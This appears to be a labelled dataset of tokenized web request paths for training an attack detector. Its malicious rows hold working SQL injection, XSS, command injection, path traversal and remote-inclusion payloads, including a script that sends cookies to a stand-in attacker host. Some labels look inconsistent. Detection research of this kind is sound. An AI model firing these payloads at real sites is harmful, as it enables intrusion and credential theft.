request	label
/ examples / jsp / jsp2 / el / index . cfm ? fuseaction = category . display & category_id =  ' 	1
/ string / strings / parameters = -7562 )  or 8571 = 8571 -- 	1
/ scripts / index . php ? sensor_program =  < script > alert (  ' phpsysinfo_multiple_xss . nasl '  )  ;  <  / script > 	1
"/ help . php ? q =  "" uname  # "	1
/ string / strings / parameters = 1 '  |  |  ( select  ' oyyu '  where 6765 = 6765 or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  )  |  |  ' 	1
/ stoikvideoconverter20 / 	0
/ string / strings / parameters = |   [  6 -ne  $  ( echo cxwpxj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ manager / lib / adodb_lite / adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  / 	1
/ examples / jsp / num / javascript . php ? abs_path =  / etc / passwd \ x00 	1
/ javascript / donate . exe 	1
/ string / strings / parameters = arguisuelas 	0
/ string / strings / parameters = |   [  2 -ne  $  ( echo qhewvv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # 	1
/ cgi-bin / feedsplitter . php ? format =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & debug = 1 	1
"/ examples / jsp / error / wordtrans . php ? command = show_desc & advanced = 1 ""  ; id ;  true  "" "	1
/ string / strings / parameters = 1 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
/ mozart / 	0
/ javascript / page2 . exe 	1
"/ string / strings / parameters = \  ""  < scr < script > ipt > alert ( 0x000123 )  <  / scr <  / script > ipt > "	1
/ javascript / obsoleted . exe 	1
/ reviewsubmit / 	0
"/ string / strings / parameters = '  ;  str =  $  ( echo ueoozq )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ string / modo = registro & login = veen & password = sar * genta & nombre = vigilio & apellidos = mitjavila + oca & email = seeck @ lawn . gu & dni =  '  + and +  ' 1 '  =  ' 1 & direccion = calle + ripolles + 83 ,  +  & ciudad = valderrbano & cp = 16812 & provincia = valencia & ntc = 7619192104254644 & b1 = registrar 	1
/ string / strings / parameters = 1 '  )  )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  (  (  ' cqwz '  like  ' cqwz 	1
/ lavion / 	0
/ string / strings / parameters = 27744538y 	0
/ catproducts / 	0
/ ortcp5 / 	0
/ string / strings / parameters = ; echo tkervj $  (  ( 79 + 50 )  )  $  ( echo tkervj ) tkervj 	1
/ p_quote / 	0
/ string / strings / parameters = 4829100959791841 	0
/ htbin / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = cigudosa 	0
/ dotmac4 / 	0
/ paranaeducativa / 	0
/ string / strings / parameters = dederika 	0
/ clerkdocs / 	0
/ belmondo / 	0
/ string / strings / parameters = 08181 	0
/ string / strings / parameters = '  &  & echo cmxojb $  (  ( 29 + 98 )  )  $  ( echo cmxojb ) cmxojb ' 	1
/ vervolgopleidingen / 	0
/ 1004355418 / 	0
/  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini 	1
/ string / modo = registro & login = ramiz & password = garantir & nombre = enrico & apellidos = vallb + olmos & email = pangborn @ informex . me & dni = 07485924e & direccion = c /  + las + chumberas ,  + 38 ,  +  & ciudad = medina + de + rioseco & cp = 40320 & provincia = segovia & ntc = 9431159156347522 & b1 = registrar 	0
/ card_kt0db90e49b0 / 	0
/ ref100101 / 	0
/ examples / jsp / cal / index . php ? inc = http :  /  / xxxxxx .  / foo 	0
/ 2002454021_dnafib27 / 	0
/ q52295844 	0
/ javascript / topics / 	0
/ javascript / groupcp . exe 	1
/ loudblog / inc / parse_old . php ? template =  @ system ( id )  ;  @  & php_use = 1 & phpseparator =  @ 	1
/ 175126 / 	0
/ string / strings / parameters = -2495 )  )  as hudw where 4197 = 4197 or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  -- 	1
/ string / strings / parameters = '  ) print (  ` echo nfasem `  .  ` echo  $  (  ( 28 + 31 )  )  `  .  ` echo nfasem `  .  ` echo nfasem `  )  ;  /  / nfasem 	1
/ javascript / web-inf . xslt 	0
/ javascript / file . yml 	0
/ 5o9zq43e . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ gestart / aide . php3 ? aide = xxpathxx ? 	1
/ branded to kill-divx / 	0
/ string / strings / parameters = barranco de fraga 132 11c 	0
/ cgi-bin / nslookup . cgi ? query = localhost ; id & type = any & ns = 	1
/ string / strings / parameters = < script src = http :  /  / ha . ckers . org / xss . js >  <  / script > 	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 & cantidad = 85 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = ;  str =  $  ( echo drvins )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ javascript / notifications . mdb 	0
/ string / strings / parameters = 1 '  )  )  )  and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 )  and  (  (  (  ' cimm '  like  ' cimm 	1
/ string / modo = registro & login = scalabri & password = carnaz9 & nombre = almando & apellidos = blasi & email = miramon @ custombikescloth @  @ e @ s . at & dni = 67014940r & direccion = mariucha ,  + 133 ,  + 11e & ciudad = foradada & cp = 16800 & provincia = crdoba & ntc = 1771682809315400 & b1 = registrar 	1
/ nessus \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini 	1
/ javascript / ccbill . part 	0
/ examples / jsp / colors / lib / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / strings / parameters = < style > a { background : url (  ' s1 '   ' s2 )  }  @ import javascript : javascript : alert ( 1 )  ;  '  )  ;  }  <  / style > 	1
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo tymeog  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / strings / parameters = bertorelli 	0
/ string / strings / parameters = a99b3do 	0
"/ en-us / dda2qr7j . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ cacti / rss . php ? blogid = 1 & profile =  .  .  /  .  .  / config / config . properties . php \ x00 	1
/ b8725-90039 / 	0
/ gnomes / 	0
/ string / strings / parameters = <  / form > 	1
/ 597308 / 	0
/ stronghold-info 	0
/  .  .  \  .  .  \  \  \  { file } 	1
/ cgi-915 / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ cgi-bin / story . pl ? next =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ 20030526 / 	0
/ javascript / promoted . exe 	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testkhwc = 4028 ""  > "	1
/ string / strings / parameters = cus motj 	0
/ string / strings / parameters = boes @ cumbareback . kz 	0
/ iisadmpwd /  .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ string / strings / parameters = yaeger 	0
/ index . php ? categories = 1 & cat = xx '  union /  *  *  /   select  ' 1 '  ,  ' 412596083481 '  ,  ' 2 '  ,  ' comments '   /  * 	1
/ string / strings / parameters = xsstest	1
/ string / strings / parameters = dikaitis5 	0
/ ufuinstall / 	0
"/ help . php ? q =  ""  | ping \ x0c-w \ x0c11000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c "	1
/ string / strings / parameters = regaladam_ente 	0
/ 11770614 / 	0
/ string / strings / parameters = frydtberg @ archivodeimagenes . cat 	0
/ fpnyemix / 	0
/ clubdjpro / 	0
/ string / strings / parameters = 42569506w 	0
/ 30880156 / 	0
/ string / strings / parameters = 1 )  )  as debc where 7428 = 7428 union all select null , null , null # 	1
/ string / strings / parameters = 0476227677122044 	0
/ javascript / authors . gz 	0
/ string / modo = registro & login = sawyers & password = encumb2ad3 & nombre = max & apellidosa = sjstrand + ampurias & email = tamburi @ hispadis . ar & dni = 30293636z & direccion = c /  + virgen + de + las + angustias + 122 + 4 ? a & ciudad = fuentespina & cp = 48220 & provincia = asturias & ntc = 8898020239162472 & b1 = registrar 	1
/ string / strings / parameters = 34111 	0
/ iowacentric / 	0
/ rfc4774 / 	0
/ 20021217-14 / 	0
/ news / include / createdb . php ? langfile ;  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ? 	1
/ javascript / synced . pfx 	0
/ 9o6g5vkn . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 1 %  '  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  '  %  '  =  ' 	1
/ javascript / hire . csv 	0
/ string / strings / parameters = 1 and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  gynj 	1
/ string / strings / parameters = guayabo 	0
/ javascript / req . php 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo imleuv )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ string / strings / parameters = .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / localstart . asp	1
/ string / strings / parameters = fuente el saz de jarama 	0
/ string / strings / parameters = blascosancho 	0
/ string / modo = entrar & login = vanda & pwd = 5esl4chu6002ra & remember = off & b1 =  '  + and +  ' 1 '  =  ' 1 	1
/ string / strings / parameters = egido s / n 	0
/ md_lawsta / 	0
/ varvarname2 / 	0
/ manager /  ? user = jffnms_user_sql_injection . nasl '  union select 2 ,  ' admin '  ,  '  $ 1 $ rxs1rotx $ iza1s3fccfyvfa9rwkbmi .  '  ,  ' administrator '  --  & file = index & pass = 	1
/ string / strings / parameters = 1 %  '  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  '  %  '  =  ' 	1
/ manager / bandwidth / index . cgi ? action = showmonth & year =  < script > foo <  / script >  & month =  < script > foo <  / script > 	1
/ cron . php ? root_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / llumt7msyau5y ? 	0
"/ a0imiuf1 . cfc ?  < script > document . cookie =  "" testxqrn = 4654 ;  ""  <  / script > "	1
/ javascript / www3 . jsp 	0
/ string / strings / parameters = 19277 	0
/ setupmbeanserver / 	0
/ javascript / adm . bin 	0
/ dump . php . 1 	0
"/ recordings / server . pt ? open = space & name =  ""  ;  }  <  / script >  < script > alert (  ' plumtree_name_xss . nasl '  )  <  / script > "	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 & cantidad = 97 & b1 = aadir + al + carrito 	0
/ south park season 4 - complete / 	0
"/ h21y8w52 . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ windows-software / 	0
/ phpmyadmin / index . cfm ? fuseaction = category . display & category_id =  ' 	1
"/ tukodz3j . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ bibliothecaantiqua / 	0
/ string / strings / parameters = othello 	0
/ string / strings / parameters = ;  str =  $  ( echo ytykpd )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ string / strings / parameters = 1 )  )  as oqyo where 7995 = 7995 ; select pg_sleep ( 5 )  -- 	1
/ wbxml / wbxml / decoder . php ? base_dir = xxpathxx 	1
/ string / strings / parameters = 4815643958728547 	0
/ 1x1-white / 	0
"/ string / modo = registro & login = kapil & password = d1c36o4ca & nombre = berina + del + valle & apellidos = artico & email =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & dni = 17826694s & direccion = c /  + historiador + rodrigo + pertegas ,  + 149 ,  + 8-e & ciudad = palafolls & cp = 25218 & provincia = cceres & ntc = 3256313581077416 & b1 = registrar "	1
/ index_818 / 	0
/ 042806cdpm2 / 	0
/ string / strings / parameters = |   [  8 -ne  $  ( echo pctukx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ string / strings / parameters = michels 	0
/ string / strings / parameters = 7661 	0
/ string / strings / parameters = 1 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  --  jduw 	1
/ steak-day / 	0
/ javascript / external . ep 	0
"/ 3j8echh0 . php ?  < meta http-equiv = set-cookie content =  "" testfuqi = 4189 ""  > "	1
/ string / modo = registro & login = archie & password = esclarecidamente & nombre = efrn & apellidos = fainstein + ferrete & email = garde3 @ gay-tantra . kw & dni = 72500690k & direccion = calle + conde + de + cartagena + 97 + 5f & ciudad = trujillo & cp = 28660 & provincia = barcelona & ntc = 6775762435738331 & b1 = registrar 	0
/  % uff0e % uff0e % u2215 % uff0e % uff0e % u2215 % uff0e % uff0e % u2215 { file } 	1
/ examples / jsp / num / showcat . php ? cat = 1 ' 	1
/ javascript / dbmodules . txt 	0
"/ string / strings / parameters = -8988 ""  ""  )  )  or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  ""  "" dyxh ""  ""  like  ""  "" dyxh "	1
/ 040083 / 	0
/ string / strings / parameters = c /  san quintin 104 8-b 	0
/ string / strings / parameters = '  echo rfttcp $  (  ( 93 + 3 )  )  $  ( echo rfttcp ) rfttcp 	1
/ 156442 / 	0
/ string / strings / parameters = echo rwvtyr $  (  ( 38 + 86 )  )  $  ( echo rwvtyr ) rwvtyr ' 	1
/ ar2006122201476 / 	0
/ string / strings / parameters = 1 and 5934 = 7745 	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 100 & cantidad = 0 & b1 = aadir + al + carrito 	0
/ codewalletpro / 	0
/ examples / jsp / num / protection . php ? action = logout & siteurl =  / etc / passwd 	1
/ manager / contrib / forms / evaluation / c_formevaluation . class . php ? fileroot =  / etc / passwd \ x00 	1
"/ q703m78q . htm ?  < meta http-equiv = set-cookie content =  "" testvowq = 604 ""  > "	1
/ string / modo = insertar & precio = 9437 & b1 = pasar + por + caja 	0
"/ string / strings / parameters = < frameset >  < frame src =  \  "" javascript : alert (  ' xss '  )  ;  \  ""  >  <  / frameset > "	1
/ string / id = 3sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & nombre = queso + manchego & precio = 39 & cantidad = 24 & b1 = aadir + al + carrito 	1
/ javascript / wwwuser . bz2 	0
/ string / modo = registro & login = cubical & password = 6itihu4 & nombre = amada & apellidosa = hidalgo + bologna & email = blyth @ elsentidodelavida . sl & dni = 23735828n & direccion = clavijo + 55 ,  +  & ciudad = retuerta + del + bullaque & cp = 34469 & provincia = teruel & ntc = 1890475688764912 & b1 = registrar 	1
/ string / strings / parameters = & echo dacxmn $  (  ( 57 + 35 )  )  $  ( echo dacxmn ) dacxmn ' 	1
"/ top . php ? stuff =  "" ping \ xa0-w \ xa011000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0 "	1
/ javascript / 4 . tar 	0
/ chandrajanway / 	0
"/ top . php ? stuff =  "" del q95826835  # "	1
/ string / strings / parameters = 40142181m 	0
/ scgi-bin / nph-showlogs . pl ? files =  .  .  /  .  .  /  & filter =  .  *  & linecnt = 500 & refresh = 0 & submit = go 	1
/ string / strings / parameters = malia 	0
"/ l13b77e5 . php3 ?  < meta http-equiv = set-cookie content =  "" testjvvf = 7721 ""  > "	1
/ osraids / 	0
/ i2n4v4rl . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = 1 ""  ""  )  )  ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual -- "	1
/ string / strings / parameters = < link rel = stylesheet href =  ' data :  ,  +  / v8 *  { x : e + ahgaca-ression ( confirm ( 1 )  )  }  '   > 	1
/ modules . php ? name = search & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini \ x00 	1
"/ string / strings / parameters = < script > document . cookie =  "" testgfjr = 1286 ;  ""  <  / script > "	1
"/ string / strings / parameters = \  \  ""  ; alert (  ' xss '  )  ;  /  / "	1
/ string / strings / parameters = fuencaliente de la palma 	0
/ 21261906_ksyusha / 	0
/ string / strings / parameters = 09540 	0
/ bearings / 	0
/ silfra / 	0
/ string / strings / parameters = 35200 	0
/ string / strings / parameters = vereen @ campodegolf . com . sj 	0
/ rbottom / 	0
/ 5297710 / 	0
/ fcgi-bin / ppdscgi . exe 	1
/ faithtalk / 	0
/ phpmyadmin / export . php ? what =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = mcilrath 	0
"/ string / strings / parameters = ""  >  < script / src = data :  , alert ( 1 )  & sol ;  & sol ; "	1
/ examples / jsp / cal / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ webdefend_gs2 / 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo frmtbn )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  ' "	1
"/ en-us / s7qus4g3 . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 1212wifidefense / 	0
/ 128487937 / 	0
/ string / strings / parameters = 1 '  where 2332 = 2332 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ string / id = 2 & nombre = queso + manchego & precio = 100 & cantidad = 29 & b1 = aadir + al + carrito + 	1
/ javascript / dirs . error 	0
/ string / strings / parameters = 48102 	0
/ 0672324296 / 	0
/ javascript / business . exe 	1
/ 000025113 / 	0
/ string / modo = registro & login = oplinger & password = 3i49uicin & nombre = zidanelia & apellidos = linares + barreras & email = henckels @ easyviaggio . tr & dni = 38036492n & direccion = calle + juan + de + juanes ,  + 143 +  & ciudad = miranda + de + arga & cp = 09311 & provincia = salamanca & ntc = 0908272174397466 & b1 = registrar 	0
/ playerfaq / 	0
/ string / strings / parameters = 46714 	0
/ javascript / flash . py 	0
/ virus-bursters / 	0
/ en-us / account / directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = < img src \ x32 = x onerror =  "" javascript : alert ( 1 )  ""  > "	1
/ javascript / aliases . yml 	0
/ string / strings / parameters = -6733 '  )  where 4024 = 4024 union all select 4024 , 4024 , 4024 , 4024 # 	1
/ foam-thumb / 	0
/ string / strings / parameters = 05309 	0
/ animal_comfort / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  and 3754 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  (  (  ""  "" wwaq ""  ""  =  ""  "" wwaq "	1
